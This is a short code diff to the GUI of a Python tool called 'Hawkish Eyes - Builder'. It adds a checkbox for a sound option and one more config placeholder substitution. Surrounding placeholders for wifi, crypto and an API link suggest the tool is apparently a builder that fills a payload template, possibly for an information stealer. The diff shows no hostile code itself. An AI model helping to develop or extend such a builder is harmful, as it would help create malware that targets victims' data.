@@ -107,7 +107,7 @@ class Hawkish(customtkinter.CTk):
 
         #title, icon
         self.title("Hawkish Eyes - Builder")
-        self.geometry("820x540")
+        self.geometry("820x580")
         self.iconbitmap("Hawkish_assets\img\logo.ico")
 
         #base
@@ -222,6 +222,9 @@ class Hawkish(customtkinter.CTk):
 
         self.next_option_button = customtkinter.CTkButton(self.options_frame, width=40, height=30, fg_color="transparent", hover_color=("gray75", "gray25"), text="", image=self.arrow, command=self.crypto_event)
         self.next_option_button.grid(row=14, column=2, padx=1)
+
+        self.soundlilvoice = customtkinter.CTkCheckBox(self.options_frame, text="Enable Little Voice in headphones\n(Hawkish Rap)", fg_color=("gray75", "gray25"), hover_color="#ff0026",onvalue='yes', offvalue='no')
+        self.soundlilvoice.grid(row=15, sticky="nw", padx=40, pady=(0, 13))
 
 
         #Crypto category
@@ -487,6 +490,7 @@ class Hawkish(customtkinter.CTk):
                     .replace("%_config_741%", str(self.wifi_button.get()))
                     .replace("%_config_169%", str(self.icb.get()))
                     .replace("%_config_119%", str(self.iacb.get()))
+                    .replace("%_config_c76%", str(self.soundlilvoice.get()))
                     .replace("%API_LINK%", str(self.api_link_input.get().replace("\n", ""))))
 
 
